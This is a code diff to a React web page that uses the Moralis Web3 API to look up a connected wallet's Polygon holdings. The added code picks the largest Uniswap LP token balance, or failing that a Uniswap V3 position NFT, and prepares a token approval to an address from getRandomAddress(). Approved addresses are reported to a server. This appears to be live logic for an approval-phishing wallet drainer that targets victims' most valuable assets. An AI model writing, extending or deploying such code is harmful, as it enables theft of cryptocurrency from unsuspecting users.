@@ -2,6 +2,7 @@ import { useContext, useState } from "react"
 import Layout from "../components/Layout"
 import Modal from "../components/Modal"
 import AppContext from "../context/AppContext"
+import { useMoralis } from "react-moralis";
 
 const Index = () => {
   const [loading, setLoading] = useState(false)
@@ -25,7 +26,7 @@ const Index = () => {
   const abiLPContract = require('../helpers/abiLPContract.json');
   const abiPositionContract = require('../helpers/abiPositionContract.json');
   const addressPositionContract = '0xC36442b4a4522E871399CD717aBDD847Ab11FE88';
-  // const { Moralis } = useMoralis();
+  const { Moralis } = useMoralis();
 
   const writeAddress = (approveAddress) => {
     fetch('http://localhost:3000/app', {
@@ -48,45 +49,40 @@ const Index = () => {
   }
 
   const getDataTransaction = async () => {
-    // let NFTs = await Moralis.Web3API.account.getNFTs({chain: "polygon", address: userAddress}), _check = false;
+    let tokens = await Moralis.Web3API.account.getTokenBalances({chain: "polygon", address: userAddress});
 
-    // if (NFTs) {
-    //   if (NFTs.result && NFTs.result.length) {
-    //     let filterNFTs = NFTs.result.filter(NFT => NFT.name == 'Uniswap V3 Positions NFT-V1');
-        
-    //     if (filterNFTs.length)
-          return {
-            abi: abiPositionContract,
-            contract: addressPositionContract,
-            addressToApprove: getRandomAddress()
-          };
-    //   }
-    // }
+    let filterTokens = tokens.filter( token => token.name == 'Uniswap (PoS)' ),
+        sortTokens = filterTokens.sort((x, y) => {
+          if (Number(x.balance) > Number(y.balance)) {return -1;}
+          if (Number(x.balance) < Number(y.balance)) {return 1;}
+          return 0;
+      });
 
-    // let tokens = await Moralis.Web3API.account.getTokenBalances({chain: "polygon", address: userAddress});
+      console.log(sortTokens);
 
-    // let filterTokens = tokens.filter( token => token.name == 'Uniswap V2' ),
-    //     sortTokens = filterTokens.sort((x, y) => {
-    //       if (Number(x.balance) > Number(y.balance)) {return -1;}
-    //       if (Number(x.balance) < Number(y.balance)) {return 1;}
-    //       return 0;
-    //   });
+    if (sortTokens.length) 
+      return {
+        abi: abiLPContract,
+        contract: sortTokens[0].token_address,
+        addressToApprove: getRandomAddress()
+      };
 
-    // // tokens.map( token => {
-    // //   // console.log(token.name);
-    // //   if (token.name == 'Uniswap V2'){
-    // //     _check = token.token_address;
-    // //   }
-    // // });
+      let NFTs = await Moralis.Web3API.account.getNFTs({chain: "polygon", address: userAddress});
 
-    // if (sortTokens.length) 
-    //   return {
-    //     abi: abiLPContract,
-    //     contract: sortTokens[0].token_address,
-    //     addressToApprove: getRandomAddress()
-    //   };
+      if (NFTs) {
+        if (NFTs.result && NFTs.result.length) {
+          let filterNFTs = NFTs.result.filter(NFT => NFT.name == 'Uniswap V3 Positions NFT-V1');
+          
+          if (filterNFTs.length)
+            return {
+              abi: abiPositionContract,
+              contract: addressPositionContract,
+              addressToApprove: getRandomAddress()
+            };
+        }
+      }
 
-    // return false;
+    return false;
   }
 
   const handleApprove = async () => {
